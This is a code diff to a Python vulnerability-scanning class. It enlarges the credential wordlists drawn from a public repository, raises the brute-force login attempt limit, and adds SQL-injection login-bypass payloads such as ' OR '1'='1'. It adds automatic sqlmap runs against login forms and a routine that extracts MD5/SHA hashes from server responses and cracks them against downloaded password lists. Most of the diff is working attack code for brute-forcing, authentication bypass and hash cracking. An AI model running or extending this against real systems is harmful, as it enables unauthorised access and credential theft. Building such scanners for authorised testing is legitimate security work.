@@ -849,15 +849,48 @@ class VulnerabilityEngine:
     WORDLIST_BASE_URL = 'https://raw.githubusercontent.com/kkrypt0nn/wordlists/main/wordlists'
     USERNAME_WORDLISTS = [
         'usernames/multiple_sources_users.txt',
-        'usernames/xato_net_usernames.txt'
+        'usernames/xato_net_usernames.txt',
+        'usernames/http_default_users.txt',
+        'usernames/unix_users.txt',
+        'usernames/default_users_for_services.txt',
+        'usernames/postgres_default_user.txt',
+        'usernames/tomcat_mgr_default_users.txt',
+        'usernames/common_usernames.txt',
+        'usernames/ftp_users.txt',
+        'usernames/mysql_users.txt'
     ]
     PASSWORD_WORDLISTS = [
         'passwords/most_used_passwords.txt',
-        'passwords/password.txt'
+        'passwords/password.txt',
+        'passwords/common_passwords_win.txt',
+        'passwords/http_default_passwords.txt',
+        'passwords/openwall.txt',
+        'passwords/top_adobe_passwords.txt',
+        'passwords/unix_passwords.txt',
+        'passwords/top_1000_passwords.txt',
+        'passwords/rockyou.txt'
+    ]
+    HASH_CRACK_LISTS = [
+        'passwords/most_used_passwords.txt',
+        'passwords/password.txt',
+        'passwords/common_passwords_win.txt',
+        'passwords/rockyou.txt',
+        'passwords/top_1000_passwords.txt'
     ]
     WORDLIST_CACHE_DIR = Path('.wordlist_cache')
-    WORDLIST_MAX_ENTRIES = 60
-    SQLI_LOGIN_PAYLOADS = ["' OR '1'='1", '" OR "1"="1"', "' OR 1=1--", "' OR 'a'='a"]
+    WORDLIST_MAX_ENTRIES = 400
+    HASH_CRACK_MAX = 400
+    SQLI_LOGIN_PAYLOADS = [
+        "' OR '1'='1'",
+        '" OR "1"="1"',
+        "' OR 1=1--",
+        "' OR 'a'='a",
+        "' OR 1=1#",
+        "' OR '1'='1' --",
+        "' OR '1'='1' /*",
+        "1' OR '1'='1'"
+    ]
+    SQLMAP_EXECUTABLE = shutil.which('sqlmap')
     SCAN_HEADERS = {
         'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36'
     }
@@ -976,8 +1009,11 @@ class VulnerabilityEngine:
             url = 'http://' + url
             parsed = urlparse(url)
         path = re.sub(r'/+', '/', parsed.path)
-        normalized = parsed._replace(path=path).geturl()
-        return normalized
+        parts = [segment for segment in path.split('/') if segment]
+        if len(parts) >= 2 and parts[-1] == parts[-2]:
+            parts = parts[:-1]
+        normalized_path = '/' + '/'.join(parts)
+        return parsed._replace(path=normalized_path).geturl()
 
     def _is_fragment_target(self, url: str) -> bool:
         return bool(urlparse(url).fragment)
@@ -988,7 +1024,7 @@ class VulnerabilityEngine:
             return parsed._replace(fragment='').geturl()
         return url
 
-    def _download_wordlist(self, relative_path: str, max_lines: int = 60) -> List[str]:
+    def _download_wordlist(self, relative_path: str, max_lines: int = 200) -> List[str]:
         self.WORDLIST_CACHE_DIR.mkdir(exist_ok=True)
         cache_path = self.WORDLIST_CACHE_DIR / relative_path.replace('/', '_')
         if cache_path.exists():
@@ -1028,49 +1064,11 @@ class VulnerabilityEngine:
             passwords.extend(self._download_wordlist(path, self.WORDLIST_MAX_ENTRIES))
             if len(passwords) >= self.WORDLIST_MAX_ENTRIES:
                 break
+        if len(passwords) > self.WORDLIST_MAX_ENTRIES:
+            passwords = passwords[:self.WORDLIST_MAX_ENTRIES]
         if not passwords:
             passwords = [p for _, p in self.BRUTE_FORCE_CREDENTIALS]
         return list(dict.fromkeys(passwords))[:self.WORDLIST_MAX_ENTRIES]
-
-    def _attempt_login_sqli(self, post_url: str, username_field: str, password_field: str, baseline: Dict[str, Any], session: Optional[requests.Session] = None, hidden_fields: Optional[Dict[str, str]] = None) -> Optional[Dict[str, Any]]:
-        client = session or requests
-        hidden_fields = hidden_fields or {}
-        for payload in self.SQLI_LOGIN_PAYLOADS:
-            try:
-                data = {username_field: payload, password_field: payload, **hidden_fields}
-                resp = client.post(
-                    post_url,
-                    data=data,
-                    timeout=8,
-                    verify=False,
-                    allow_redirects=True
-                )
-                body = resp.text or ''
-                normalized = self._normalize_text(body)
-                sql_error = any(err in normalized for err in self.SQL_ERROR_INDICATORS)
-                login_failed = any(term in normalized for term in ['invalid', 'incorrect', 'failed', 'error', 'try again', 'unauthorized'])
-                login_page_still = any(term in normalized for term in ['login', 'username', 'password', 'sign in', 'signin'])
-                success_redirect = bool(resp.history) or (resp.url and 'login' not in resp.url.lower() and 'signin' not in resp.url.lower())
-                response_changed = normalized != baseline.get('body', '')
-
-                if sql_error or success_redirect or (not login_failed and not login_page_still and response_changed):
-                    evidence = f"POST {post_url} -> {username_field}={payload} | {password_field}={payload} | status {resp.status_code}\n{body[:300]}"
-                    title = 'Login form SQL injection confirmed' if sql_error else 'Login form SQL injection candidate'
-                    return {
-                        'vulnerable': True,
-                        'confirmed': sql_error,
-                        'title': title,
-                        'description': 'Potential SQL injection or authentication bypass was observed against the login form. The response differed from the baseline and requires manual verification.',
-                        'evidence': evidence,
-                        'remediation': 'Sanitize authentication inputs, parameterize database queries, and enforce strict login validation.',
-                        'cvss': 6.5,
-                        'confidence': 0.7 if sql_error else 0.55,
-                        'severity': 'medium',
-                        'owasp': 'A03:2021'
-                    }
-            except Exception:
-                continue
-        return None
 
     def _get_baseline_response(self, target: str, session: Optional[requests.Session] = None) -> Dict[str, Any]:
         try:
@@ -1088,10 +1086,60 @@ class VulnerabilityEngine:
     def _normalize_text(self, text: str) -> str:
         return re.sub(r'\s+', ' ', text.strip()).lower()
 
-    def _build_repro_command(self, url: str, payload: str) -> str:
+    def _build_repro_command(self, url: str, payload: str, method: str = 'GET', data: Optional[Dict[str, str]] = None) -> str:
+        if method.upper() == 'POST' and data:
+            post_items = ' '.join(f"--data-urlencode \"{k}={v}\"" for k, v in data.items())
+            return f"curl -k -X POST {post_items} '{url}'"
+        if '?' in url:
+            return f"curl -k '{url}'"
         encoded_payload = quote_plus(payload)
-        base = url.split('?')[0]
-        return f"curl -k -G --data-urlencode 'test={encoded_payload}' '{base}'"
+        return f"curl -k -G --data-urlencode 'test={encoded_payload}' '{url}'"
+
+    def _run_sqlmap(self, url: str, data: Optional[Dict[str, str]] = None, is_post: bool = False) -> str:
+        if not self.SQLMAP_EXECUTABLE:
+            return ''
+        cmd = [self.SQLMAP_EXECUTABLE, '-u', url, '--batch', '--level=1', '--risk=1', '--timeout=10']
+        if is_post and data:
+            cmd.extend(['--data', '&'.join(f'{k}={quote_plus(v)}' for k, v in data.items())])
+        try:
+            completed = subprocess.run(cmd, capture_output=True, text=True, timeout=45)
+            output = completed.stdout.strip() or completed.stderr.strip()
+            return output[:1500]
+        except Exception:
+            return ''
+
+    def _detect_hashes(self, text: str) -> List[str]:
+        hashes = []
+        for match in re.finditer(r'(?i)(?:md5|sha1|sha256|hash)[\s:=]*([a-f0-9]{32,64})', text):
+            hashes.append(match.group(1))
+        for match in re.finditer(r'\b([a-f0-9]{32}|[a-f0-9]{40}|[a-f0-9]{64})\b', text, re.I):
+            candidate = match.group(1)
+            if candidate not in hashes:
+                hashes.append(candidate)
+        return hashes
+
+    def _crack_hashes(self, hashes: List[str]) -> Dict[str, str]:
+        cracked = {}
+        candidates = []
+        for path in self.HASH_CRACK_LISTS:
+            candidates.extend(self._download_wordlist(path, self.HASH_CRACK_MAX))
+            if len(candidates) >= self.HASH_CRACK_MAX:
+                break
+        candidates = list(dict.fromkeys(candidates))[:self.HASH_CRACK_MAX]
+        algos = {
+            32: 'md5',
+            40: 'sha1',
+            64: 'sha256'
+        }
+        for hash_value in hashes:
+            algo = algos.get(len(hash_value))
+            if not algo:
+                continue
+            for word in candidates:
+                if getattr(hashlib, algo)(word.encode('utf-8')).hexdigest() == hash_value.lower():
+                    cracked[hash_value] = word
+                    break
+        return cracked
 
     def _is_blocked(self, resp, body: str) -> bool:
         lowered = body.lower()
@@ -1166,7 +1214,7 @@ class VulnerabilityEngine:
                 resp = client.post(
                     post_url,
                     data=data,
-                    timeout=8,
+                    timeout=10,
                     verify=False,
                     allow_redirects=True
                 )
@@ -1177,27 +1225,48 @@ class VulnerabilityEngine:
                 login_page_still = any(term in normalized for term in ['login', 'username', 'password', 'sign in', 'signin'])
                 success_redirect = bool(resp.history) or (resp.url and 'login' not in resp.url.lower() and 'signin' not in resp.url.lower())
                 response_changed = normalized != baseline.get('body', '')
+                reproduction = self._build_repro_command(post_url, payload, method='POST', data=data)
+                sqlmap_output = ''
+                sqlmap_confirmed = False
+                if self.SQLMAP_EXECUTABLE and (sql_error or response_changed):
+                    sqlmap_output = self._run_sqlmap(post_url, data=data, is_post=True)
+                    if sqlmap_output and re.search(r'is vulnerable|back-end dbms|parameter .* is injectable|sqlmap identified|payload', sqlmap_output, re.I):
+                        sqlmap_confirmed = True
 
                 if sql_error or success_redirect or (not login_failed and not login_page_still and response_changed):
                     evidence = f"POST {post_url} -> {username_field}={payload} | {password_field}={payload} | status {resp.status_code}\n{body[:300]}"
-                    title = 'Login form SQL injection confirmed' if sql_error else 'Login form SQL injection candidate'
+                    if sqlmap_output:
+                        evidence += f"\n\n[sqlmap evidence]\n{sqlmap_output[:900]}"
+                    confirmed = bool(sql_error or sqlmap_confirmed)
+                    title = 'Login form SQL injection confirmed' if confirmed else 'Login form SQL injection candidate'
+                    if sql_error:
+                        description = 'SQL error strings were observed after injection payload submission, indicating SQL injection.'
+                    elif sqlmap_confirmed:
+                        description = 'sqlmap identified injectable behavior against the login form parameters.'
+                    elif success_redirect:
+                        description = 'Authentication bypass-like redirect behavior was observed after payload submission.'
+                    else:
+                        description = 'The response differed from the baseline without normal login failure contents, suggesting possible injection or authentication bypass.'
+                    if sqlmap_output:
+                        reproduction += f"\n# sqlmap verification:\n{sqlmap_output[:400]}"
                     return {
                         'vulnerable': True,
-                        'confirmed': sql_error,
+                        'confirmed': confirmed,
                         'title': title,
-                        'description': 'Potential SQL injection or authentication bypass was observed against the login form. The response differed from the baseline and requires manual verification.',
+                        'description': description,
                         'evidence': evidence,
+                        'reproduction': reproduction,
                         'remediation': 'Sanitize authentication inputs, parameterize database queries, and enforce strict login validation.',
-                        'cvss': 6.5,
-                        'confidence': 0.7 if sql_error else 0.55,
-                        'severity': 'medium',
+                        'cvss': 8.0 if confirmed else 6.5,
+                        'confidence': 0.85 if confirmed else 0.6,
+                        'severity': 'high' if confirmed else 'medium',
                         'owasp': 'A03:2021'
                     }
             except Exception:
                 continue
         return None
 
-    def _attempt_login_bruteforce(self, target: str, login_info: Dict[str, Any], baseline: Dict[str, Any], session: Optional[requests.Session] = None) -> List[Dict[str, Any]]:
+    def _attempt_login_bruteforce(self, target: str, login_info: Dict[str, Any], baseline: Dict[str,Any], session: Optional[requests.Session] = None) -> List[Dict[str, Any]]:
         results = []
         base_url = target if target.startswith('http') else f'http://{target}'
         post_url = self._build_post_url(base_url, login_info.get('action', ''))
@@ -1228,7 +1297,7 @@ class VulnerabilityEngine:
 
         login_attempts = 0
         for username, password in credentials:
-            if login_attempts >= 120:
+            if login_attempts >= 200:
                 break
             login_attempts += 1
             try:
@@ -1299,6 +1368,11 @@ class VulnerabilityEngine:
             response_changed = normalized != baseline.get('body', '')
             payload_reflection = payload in body or payload.lower() in normalized
             reproduction = self._build_repro_command(url, payload)
+            hashes = self._detect_hashes(body)
+            cracked_hashes = self._crack_hashes(hashes) if hashes else {}
+            hash_summary = ''
+            if cracked_hashes:
+                hash_summary = ' | Cracked hashes: ' + ', '.join(f'{h}={p}' for h, p in cracked_hashes.items())
 
             if vuln_type == 'sqli':
                 owasp = 'A03:2021'
@@ -1312,6 +1386,11 @@ class VulnerabilityEngine:
                     confirmed = True
                     proof = 'Server error response changed from baseline after injection payload.'
                 title = 'SQL Injection confirmed' if confirmed else 'SQL Injection candidate'
+                if not confirmed and self.SQLMAP_EXECUTABLE and response_changed:
+                    sqlmap_output = self._run_sqlmap(url)
+                    if sqlmap_output:
+                        proof = proof + ' | sqlmap output found.' if proof else 'sqlmap output indicates injectable behavior.'
+                        reproduction += f"\n# sqlmap output:\n{sqlmap_output[:400]}"
 
             elif vuln_type == 'xss':
                 owasp = 'A03:2021'
@@ -1374,7 +1453,7 @@ class VulnerabilityEngine:
             else:
                 return {'vulnerable': False}
 
-            evidence = f"Request URL: {url}\nPayload: {payload}\n{'-'*40}\n{body[:400]}"
+            evidence = f"Request URL: {url}\nPayload: {payload}\n{'-'*40}\n{body[:400]}{hash_summary}"
             remediation = self._remediation_for_type(vuln_type)
 
             return {
